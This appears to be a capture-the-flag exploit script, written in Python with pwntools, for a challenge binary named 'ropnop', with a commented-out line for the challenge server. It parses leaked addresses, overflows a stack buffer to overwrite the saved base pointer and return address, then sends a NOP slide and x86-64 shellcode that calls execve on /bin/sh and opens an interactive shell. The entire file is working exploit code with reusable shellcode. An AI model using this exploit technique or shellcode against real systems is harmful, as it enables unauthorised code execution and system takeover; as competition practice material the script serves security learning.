import sys
import os
from pwn import *

# nop slide and shell code to syscall execve with /bin/bash
nop_slide = b"\x90"*10
shell_code = b"\x48\xC7\xC2\x00\x00\x00\x00\x48\x8D\x3D\x12\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\x90\x90"
shell_string = bytearray("/bin/sh", "ascii")

# connect to the challenge
#p = remote("hax1.allesctf.net", 9300)
p = process("./ropnop")

# get start and end from printf
recv_buf = p.recv(64).split()

start = int(recv_buf[3], 16)
end = int(recv_buf[-1], 16)

print("start: " + hex(start))
print("end: " + hex(end))

# create first buffer overflow

# padding to fill up local stack
padding = bytearray("A"*16, "ascii")

# controll rbp to make rax point to after the read in main
rbp = struct.pack("Q", (start + 0x12d6 + 0x10))
rip = struct.pack("Q", (start + 0x12b9))

print("rbp: " + hex(start + 0x12d6 + 0x10))
print("rip: " + hex(start + 0x12b9))

input("sending first")

p.send(padding + rbp + rip)

# prepare 2 buffer overflow

input("sending secound")
p.send(nop_slide + shell_code + shell_string + b"\x00")

p.interactive()
